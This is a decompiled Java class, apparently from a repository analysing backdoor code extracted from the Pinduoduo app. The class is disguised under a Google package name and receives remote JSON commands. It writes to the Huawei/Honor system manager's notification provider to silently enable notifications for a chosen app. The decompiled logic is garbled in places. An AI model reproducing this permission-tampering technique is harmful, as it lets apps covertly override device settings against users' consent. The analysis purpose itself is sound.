package com.google.android.sd.biz_dynamic_dex.hw_permission;

import android.content.ContentValues;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class HwPermissionExecutor extends DynamicCmdExecutor {
  public void realExecute(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject(paramString);
    CmdData cmdData = new CmdData(2010, jSONObject.optString("uuid"), "client");
    try {
      ContentValues[] arrayOfContentValues;
      String str = jSONObject.optString("permission_name");
      if ("notification_enable".equalsIgnoreCase(str)) {
        if ("provider".equalsIgnoreCase(jSONObject.optString("execute_type"))) {
          String str1 = jSONObject.optString("pkg_name");
          if (!TextUtils.isEmpty(str1)) {
            boolean bool = "honor".equalsIgnoreCase(Build.MANUFACTURER);
            str = "com.huawei.systemmanager";
            String str2 = str;
            if (bool) {
              str2 = str;
              if (Build.VERSION.SDK_INT >= 30) {
                str2 = str;
                if (paramContext.getPackageManager().resolveContentProvider("com.hihonor.systemmanager.NotificationDBProvider", 128) != null)
                  str2 = "com.hihonor.systemmanager"; 
              } 
            } 
            StringBuilder stringBuilder = new StringBuilder("content://");
            stringBuilder.append(str2);
            stringBuilder.append(".NotificationDBProvider/notification_rulepreference_backup");
            Uri uri = Uri.parse(stringBuilder.toString());
            arrayOfContentValues = new ContentValues[1];
            arrayOfContentValues[0] = new ContentValues();
            arrayOfContentValues[0].put("appname", str1);
            arrayOfContentValues[0].put("isNofiticationEnable", Boolean.TRUE);
            return;
          } 
          throw new Exception("pkg_name is empty");
        } 
        throw new Exception("execute_type is invalid");
      } 
      throw new Exception("not support permission: ".concat(String.valueOf(arrayOfContentValues)));
    } finally {
      jSONObject = null;
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONObject.getMessage(), null));
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\257682c986ab449ab9e7c8ae7682fa61-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\hw_permission\HwPermissionExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */